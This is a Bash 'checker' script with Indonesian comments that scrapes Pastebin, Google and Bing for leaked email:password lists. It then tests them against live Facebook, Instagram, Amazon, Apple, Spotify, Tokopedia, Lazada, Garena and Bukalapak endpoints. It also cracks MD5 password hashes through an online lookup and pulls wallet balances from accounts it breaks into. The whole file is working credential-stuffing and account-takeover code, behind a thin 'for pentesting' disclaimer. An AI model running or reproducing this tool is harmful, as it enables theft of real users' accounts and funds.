#warning powerful can be harmful and detrimental
#GUNAKAN TOOLS INI UNTUK TUJUAN KEBAIKAN MEMBANTU PANTESTING
#BUKAN UNTUK MERUSAK SEGALA SEUSATU DI TANGGUNG PENGGUNA
#DI BUAT OPEN SOURCE
#SUPAYA KALIAN JUGA BISA BERKARYA
#/////////////////////////////////////////////////////////////////////////
#//Author: by Kedjaw3n                                                  //
#//recode ?? silahkan asal sertakan nama author nya                     //
#//w buat cape cape, bukan untuk di salah gunakan, apalagi di recode    //
#//Di buat: 15 - 02 - 2020                                              //
#//release: 17 - 02 - 2020                                              //
#//update : 25 - 02 - 2020                                              //
#//     SEKALI LAGI JANGAN DI RECODE ANJING W BUAT NYA CAPE LO          //
#//          TINGAL PAKE AJA APA SUSAH NYA SI JANCOK                    //
#//                /NGA USAH BUAT PENCITRAAN                            //
#/////////////////////////////////////////////////////////////////////////
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
O='\033[0;33m'

dependencies=( "grep" "curl" "gawk" "sed" "diff" "awk")
for pkg in "${dependencies[@]}";do    
    command -v $pkg >/dev/null 2>&1 || { echo -e >&2 "${O}$pkg ${N}: belum terinstall - akan menginstallnya" && apt-get install $pkg -y
    }
done
sp="1234567890"
sc=0
spin() {
   printf "\b${sp:sc++:1}"
   ((sc==${#sp})) && sc=0
}
endspin() {
   printf "\r%s\n" "$@"
}  

dumper(){
  echo "cth: maillist, empass, @yahoo, combolist and use your brain"
  read -p "keywoard: " word
  echo "please wait pastikan koneksi cepat dan stabil..."
key=$(sed "s/ /+/g" <<< $word)
rm -rf .hasil
curl -s https://psbdmp.ws// -X POST -d "string=$key" | grep -Po "href='[^']*" | cut -d "'" -f2 | sed "s,.com,.com/raw,g" >> .hasil
curl -s "https://pastebin.com/search?q=$key" | grep "<li>" | grep -Po 'href="(.*?)"' | cut -d '"' -f2 | sed "s,/,https://pastebin.com/raw/,g" >> .hasil
cat .hasil | sort | uniq -i | while read past
do
   echo -e "Result => ${O}$past ${N}"
done
trap break INT
for hitung in $(seq 1 10)
do
  echo -ne "\nprocessing dump email from google and bing......"
  spin
curl -s --max-time 240 "https://www.google.com/search?q=site:pastebin.com+intext:$key=&start=$hitung" -L -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | grep -Po '<a href="\K.*?(?=".*)' | egrep -o "(http(s)?://){1}[^'\"]+" | sed '/facebook/d' | sed '/google/d' | sed "/\/u\//d" | sed '/instagram/d' | sed '/youtube/d' | sed '/google/d' | sed "s,.com,.com/raw,g" >> .hasil
cat .hasil | sort | uniq -i | while read past
do
   echo -en "\nResult => ${O}$past ${N}"
done
curl -sL "http://www.bing.com/search?q=site:pastebin.com+intext:$key&first=$hitung" | grep -Po '<h2><a href="[^"]*' | cut -d '"' -f2 | sed '/facebook/d' | sed '/google/d' | sed "/\/u\//d" | sed '/instagram/d' | sed '/youtube/d' | sed '/blogspot/d' | sed '/&amp/d' | sed "s,.com,.com/raw,g" >> .hasil
done;endspin
trap - INT
cat .hasil | sort | uniq -i | while read link
do
  echo -e "Dump : ${O}$link${N}"
  dump=$(curl -s "$link")
  for i in gmail yahoo aol hotmail
   do 
     echo "$dump" | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*[\:\|\ : \::]*[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $i >> $i.txt
     echo -e "[+] Result: ${G}`wc -l $i.txt`${N}"
   done
   echo "$dump" | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*[\:\|\ : \::]*[[:alnum:]+\.\_\-\]*' >> others.txt
   echo -e "[+] Others: ${G}`wc -l others.txt`${N}"
done
for akun in gmail yahoo aol hotmail others
do
  cat $akun.txt | sort | uniq -i >> cracked-$akun.txt
done
}

checker() {
echo -ne "[+] input list  : ${O}" 
read list
gg=$(cat $list 2>/dev/null | grep -Po "[[::\:\ :: \|\ | ]*]*" | head -1)
asu="$acc"
if [[ "$fb" = "y" ]]
then
   liste=$(cat $list 2>/dev/null | sed "s/${gg}/\&pass=/g")
else
   liste=$(cat $list 2>/dev/null | sed "s/${gg}/:/g")
fi
del=":"
total=$(cat $list 2>/dev/null | wc -l )
echo -e "${N}[+] Total       : ${O}$total Empas${N}\n[*] Processing please wait....."
echo -e "${N}jika ingin langsung ke hasil press CTRL + C / vol down + C\n"
rm -rf die-$list
if [[ "$apel" = "y" ]]
then
  echo -e "[*] Generating token now. Please wait..."
  resp=`curl 'https://appleid.apple.com/account' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' --compressed -D - -s -o /dev/null`
  scnt="$(echo "$resp" | grep "scnt: " | cut -c7- | xargs)"
  sessionId="$(echo "$resp" | grep "aidsp" | awk -F[=\;] '{print $2}' | xargs)"
fi
echo -e "\n-----------[ tanggal check `date +%x | tr "/" "-"` ]-----------" >> $acc-$list
trap break INT
for op in y
do
   echo "$liste" | while read ver
    do 
      email=$(echo "$ver" | cut -d "$del" -f1)
      pass=$(echo "$ver" | cut -d "$del" -f2)
      if [[ "$fb" = "y" ]]
      then
        email=$(echo "$ver" | cut -d "&" -f1)
        pass=$(echo "$ver" | cut -d "=" -f2)
        getf=$(curl --silent -b fb.tmp --compressed --connect-timeout 5 --cookie-jar fb.tmp -X POST "https://free.facebook.com/login/" -L -H "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" -H "Referer: https://mobile.facebook.com/" -d "email=$ver&login=Masuk")
        get=$(echo $getf | grep -Po "<title>Masuk Facebook | Facebook</title>")
      else
        if [[ "$amz" = "y" ]];then
        get=$(curl -s -b cookiesss.tmp --silent --compressed --connect-timeout 5 --cookie-jar cookiesss.tmp -X POST "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue" -A 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30' -d "customerName=Kedjaw3n&email=$email&emailCheck=$email&password=Kontol1337&passwordCheck=Kontol1337" | grep -Po "You indicated you are a new customer, but an account already exists with the e-mail")
      else
        if [[ "$apel" = "y" ]];then
        get=$(curl 'https://appleid.apple.com/account/validation/appleid' -H 'scnt: '$scnt'' -H 'Origin: https://appleid.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","L":"en-US","Z":"GMT+08:00","V":"1.1","F":"sWa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflJfmczl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWk3qwyWEQEe6qgXK_Pmtd0SHp815LyjaY2.rINj.rINYOK0UjVsYUMnGWFfwMHDCQyG5me6sBLSsbXzU0l6sqKIrGfuzwg9wK9weEwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesR0CjEcIqnuWxf7_OLgiPFMtrs1OeyjaY2_GGEQIgwe98vDdYejftckuyPBDjaY2ftckZZLQ084akJlJWu_uWA16fUfR0odm_dhrxbuJjkWxv5iJ6KVg8cGYiKY.6elV2pN9csgdmX3ivm_Ud_UeAwHCSFQ_0pNvS_MNJZNlY5DuV25BNnOVgw24uy.CfT"}' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: idclient=web; dslang=US-EN; site=USA; aidsp='$sessionId'; ccl=OXqm9r6b+jMZIrOKHBgGZQ==; geo=ID' -H 'Connection: keep-alive' -H 'X-Apple-Api-Key: 'cbf64fd6843ee630b463f358ea0b707b'' -H 'X-Apple-ID-Session-Id: '$sessionId'' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://appleid.apple.com/account' -H 'X-Apple-Request-Context: create' --data-binary '{"emailAddress":"'$email'"}' --compressed -D - -s | grep -Po 'used" : true')
      else
        if [[ "$paypal" = "y" ]];then
        get=$(curl -s http://railwaylinks.com/PayPal-checker/PayPal-checker/api.php?email=$email | cut -d '"' -f10 | grep -Po "live")
      else
        if [[ "$tokped" = "y" ]];then
        get=$(curl -s -X POST --url "https://www.tokopedia.com/api/v1/account/register/email/check" -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6" -H "x-mod-sbb-ctype: xhr" -H "x-requested-with: XMLHttpRequest" -d "email=$email" | grep -Po "true")
      else
        if [[ "$spot" = "y" ]];then
          get=$(curl -sL "https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email=$email" | grep -Po "false")
      else
        if [[ "$ig" = "y" ]];then
        get=$(curl 'https://www.instagram.com/accounts/login/ajax/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:62.0) Gecko/20100101 Firefox/62.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H 'X-CSRFToken: wlQIvzn15oniituLCZSAGGVZjfV0UcS5' -H 'X-Instagram-AJAX: 2187d49e65cd' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: mcd=3; mid=W5qlQAAEAAFXPreV3XNacJ61ALnR; csrftoken=wlQIvzn15oniituLCZSAGGVZjfV0UcS5; csrftoken=wlQIvzn15oniituLCZSAGGVZjfV0UcS5; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=ihuAH-2s8j0SDws2-U5W_VEBnKiKqhB8CMiRYxkPn6g.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUURpa2xfMTBRejFNOGN0d2J6WmlGS0UxdzNHamRWNVhFa2NCNjVmMlFxV3hnYjNJSUFjbE55cDRoT0FZNUJRcTV1dEhaNGVrd3p1aWxTRUlFdFdMZXA0Y3ZqalhlYjhmaXRvNmNyclpwOGlqd2lMWTdja0tUNmlacEtINUhoTi1lVzdsMzRreDJSRndwVF84YW54MnFhbGRubjU5MWR2bURPU0lHdFIyOTJwM0U2d2g0eHBPYzhEb3dSaTFNeG5vVnlvcHEzWkJCeFN0Yi03Qm51VWV6QkhkbVU1U3hvWEVadXpyd0FSeG9oMmNEYndRcHJoZ2pNdFktekZyaXpuRWtDdF9QbUdIX0RKSXRxY2JzRWxpYjBHbVFUVGE3WEhiME1LUm9MU2FYNlhQUjk1UGswSnI5aFk3aWtMWHlVSkt5Yy1YN0oxVzVsdVJqZzRGLVg0MlRidnBDNFdYWHpRRDhzZmF6RVZfQkhXS1EiLCJpc3N1ZWRfYXQiOjE1MzY4OTIwMDUsInVzZXJfaWQiOiIxMDAwMDQwNzk4NzUwNzEifQ; rur=PRN; urlgen="{}:1g0dk9:nMpYRFIKbmnIpmhnWNgilpDxlGc"' -H 'Connection: keep-alive' --data "username=$email&password=$pass&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D" --compressed -D - -s | grep -Po 'true|authenticated": true')
      else
        if [[ "$hash" = "y" ]];then
        get=$(curl -s --max-time 50 "http://www.nitrxgen.net/md5db/$pass" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0")
      else
        if [[ "$lazada" = "y" ]]; then
        get=$(curl -sL "https://member.lazada.co.id/user/api/checkEmailUsage?email=$email" | grep -Po "USER|LIMIT")
      else
        if [[ "$garena" = "y" ]]; then
        get=$(curl -sL "https://sso.garena.com/api/register/check?email=$email&format=json&id=1529057399075" | grep -Po "error_email_existed")
      else
        if [[ "$bl" = "y" ]];then
           get=$(curl -c blpk.tmp -s -u "$email:$pass" https://api.bukalapak.com/v2/authenticate.json -X POST)
           cekmail=$(curl -s -X POST --data "user[email]=$email&user[username]=testingtesting9&user[name]=asadasan&user[birthday(3i)]=12&user[birthday(2i)]=12&user[birthday(1i)]=1999&user[password]=testing&user[password_confirmation]=testing&user[phone]=081238877&user[address_attributes][province]=Banten&user[address_attributes][city]=Tangerang&user[address_attributes][area]=Batuceper&user[address_attributes][address]=jl xxx&user[address_attributes][post_code]=11111]&user[policy]=1" "https://api.bukalapak.com/v2/users.json")
      fi;fi;fi;fi;fi;fi;fi;fi;fi;fi;fi
        if [[ "$lazada" = "y" ]]; then
           if echo "$get" | grep -Po 'LIMIT' >/dev/null
           then
           echo -e "${R}LIMIT : ${O}Coba lagi besok ...."
           break
        fi;fi
        if [[ "$fb" = "y" ]]
        then
           if [[ "$get" = "" ]]
           then
              if echo "$getf" | grep -Po "<title>Masukkan Kode Keamanan</title>|<title>You can&#039;t use this feature at the moment</title>" >/dev/null
              then
                 echo "$getf" | grep -Po "<title>(.*?)</title>"
                 echo -e "\x1b[0m${N}[${O}`date +%T`${N}]${O} Failed captcha => $email$del$pass ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
              else
                 echo "LIVE => $email$del$pass" >> $acc-$list.txt
                 echo "$getf" | grep -Po "<title>(.*?)</title>"
                 echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
              fi
           else
              echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${R}DIE => $email$del$pass ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
              echo "bad" >> die-$list
           fi
        else
          if [[ "$bl" = "y" ]];then
            if echo "$get" | grep -Po "OK" >/dev/null
            then 
               echo -e "ACC => $email$del$pass" >> $acc-$list
               token=$(echo "$get" | grep -Po 'token":"[^"]*' | cut -d '"' -f3)
               userid=$(echo "$get" | grep -Po 'user_id":[^,]*' | cut -d ":" -f2)
               info=$(curl -b blpk.tmp -s -u "$userid:$token" "https://m.bukalapak.com/dompet?form=user_panel")
               echo -e "[\x1b[1m\033[1;35mLOGIN ACCESS${N}]${O} ACC => $email:$pass | saldo: `echo -e "$info" | grep -Po "amount positive'>[^<]*<" | sed "s,amount positive'>,Rp. ,g" | tr -d "<" | head -1` ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
            else
               if echo "$cekmail" | grep -Po "Email sudah digunakan" >/dev/null;then
               echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${G}LIVE => $email:$pass ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
               else
                  echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${R}DIE => ${R}$email$del$pass ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
                  echo "DIE => $email$del$pass" >> die-$list
               fi
            fi
        else
          if [[ "$get" = "" ]]
           then  
                if [[ "$hash" = "y" ]];then
                   echo "${pass}" >> die-$list
                   echo -e "\x1b[0m${R}[?] Not Cracked: $email$del${pass}"
                else   
                   echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${R}DIE => ${R}$email$del$pass ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
                   echo "DIE => $email$del$pass" >> die-$list
                fi
           else
                if [[ "$hash" = "y" ]];then
                    echo "$email$del$get" >> cracked-$list
                    echo -e "\x1b[0m${G}[!] Cracked: $email$del$get"
                else
                   if [[ "$ig" = "y" ]];then
                      if echo "$get" | grep -Po 'authenticated": true' >/dev/null
                      then
                         echo -e "[\x1b[1m\033[1;35mLOGIN ACCESS${N}]${O} LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
                         echo "ACC => $email$del$pass" >> $acc-$list
                      else
                         echo "LIVE => $email$del$pass" >> $acc-$list
                         echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
                      fi
                   else
                       echo "LIVE => $email$del$pass" >> $acc-$list
                       echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|\033[0;16m\033[1;36m Checked by AgressivCode ${N}"
                   fi
                fi
           fi
        fi
      fi
     done
done
trap - INT
if [[ "$hash" = "y" ]];then
   echo -e "${N}[*] Done.....\n[+] Result : ${G}cracked-$list${N}"
   echo -e "[+] Total  : $(cat cracked-$list 2>/dev/null | wc -l) Empass Cracked"
   echo -e "[+] Total  : $(cat die-$list 2>/dev/null | wc -l) Empass Not Cracked"
   echo -e "[*] Thx for using this tools :')"
else
   echo -e "-------[ checked by AgressivCode checker ]--------\n" >> $acc-$list
   echo -e "${N}[*] Done.....\n[+] Result : ${G}$acc-$list${N}"
   if cat $acc-$list | grep -Po 'ACC =>' >/dev/null
   then
      echo -e "[+] Total  : ${G}`cat $acc-$list 2>/dev/null | grep -Po 'ACC =>' | wc -l` Login Akses ${N}"
   fi 
   echo -e "[+] Total  : ${G}$(cat $acc-$list 2>/dev/null | wc -l) Empass Live ${N}"
   echo -e "[+] Total  : ${R}$(cat die-$list 2>/dev/null | wc -l) Empass Die${N}"  
   echo -e "${O}jika Acc LIVE\ntetapi tidak bisa di pakai login kemungkinan hanya password nya yg salah atau sudah di ganti oleh pemilik akun\nuse your brain for crack that password"
   echo -e "${G}- Thx for using this tools :')${N}"
fi
}
echo -e "
     $G ╔═══╗ 
      ║╔═╗║ ${O}AgressivCode${G}
      ║║─║╠══╦══╗${O}checker \033[1;36mPRO .V.1${G}
      ║╚═╝║╔═╣╔═╝ ${O}by ./kedjaw3n${G}
      ║╔═╗║╚═╣╚═╗
      ╚╝─╚╩══╩══╝$N
      
       [ `date` ]$R
Tools email checker and utility cracking tools
           have a nice day devil $N
[?] ${G}ACc menu${N}
[1]. Amazon Email Valid checker
[2]. Apple Email valid checker
[3]. Paypal email valid checker
[4]. Facebook Account checker
[5]. tokopedia email Checker
[6]. spotify email valid checker
[7]. instagram account checker v.2
[8]. md5 empass decrytor
[9]. pastebin email dumper
ACC PRO V.1
[10]. sqli dork email dumper
[11]. Lazada email checker
[12]. Garena email checker
[13]. New bukalapak checker"
echo -n "your coise ?? "
read d
case $d in
 1) amz="y"
    acc="amazon"
    echo -e "
    | ${G}AMAZON EMAIL VALID CHECKER ${N} |
    "
    checker
 ;;
 2) apel="y"
    acc="apple"
    echo -e "
    |\033[7;32m APPLE EMAIL VALID CHECKER ${N} |
    "
    checker
 ;;
 3) paypal="y"
    acc="paypal"
    echo -e "
    |\033[7;32m PAYPAL EMAIL VALID CHECKER ${N}|
    "
    checker
 ;;
 4) fb="y"
    acc="fb"
    echo -e "
    |\033[7;32m FACEBOOK EMAIL VALID CHECKER ${N}|
    "
    checker
 ;;
 5) tokped="y"
    acc="tokopedia"
    echo -e "
    |\033[7;32m TOKOPEDIA EMAIL VALID CHECKER ${N}|
    "
    checker
 ;;
 6) spot="y"
    acc="spotify"
    echo -e "
    |\033[7;32m SPOTIFY EMAIL VALID CHECKER ${N}|
    "
    checker
 ;;
 7) ig="y"
    acc="instagram"
    echo -e "
    |\033[7;32m INSTAGRAM ACCOUNT CHECKER ${N}|
    "
    checker
 ;;
 8) hash="y"
    echo -e "
    |\033[7;32m EMAIL:Md5 Decrytor ${N}|
    "
    checker
 ;;
 9) echo -e "
    |\033[7;32m PASTEBIN EMAIL DUMPER ${N}|
    "
    dumper
 ;;
 10)
    echo -e " INI TOOLS YG SANGAT SULIT JDI BUTUH WAKTU YG SANGAT LAMA.........."
 ;;
 99) echo -e "
         |\033[7;32m AgressivCode Checker CLI ${N}|

your in free Version v.1

Pro Version

=> update tools
- CC generator + auto checker
- email dumper from sqli dork
- Gmail account checker
- yahoo account checker
- hotmail account checker
=> indonesian checker
- gojek, unipin, bukalapak
- matahari, twiter, and anymore
=> personal checker
- Netflix, Fornite, steam, adfly, wish.com

Get Pro version contact me Kedjaw3n
Thx to:${O} agressiv1njector - AgressivCode - c0rotlren9 - Lazyman_ID - Kedjaw3n${N}"
  ;;
  11) echo -e "
    |\033[7;32m LAZADA EMAIL CHECKER ${N}|
    "
    lazada="y"
    acc="lazada"
    checker
 ;;
 12) echo -e "
    |\033[7;32m GARENA EMAIL CHECKER ${N}|
    "
    garena="y"
    acc="garena"
    checker
 ;;
 13) 
    echo -e "
    |\033[7;32m BUKALAPAK ACCOUNT CHECKER ${N}|
    "
    bl="y"
    acc="bukalapak"
    checker
 ;;
   *) echo -e "[+] Thx for using this tools"
 ;;
esac
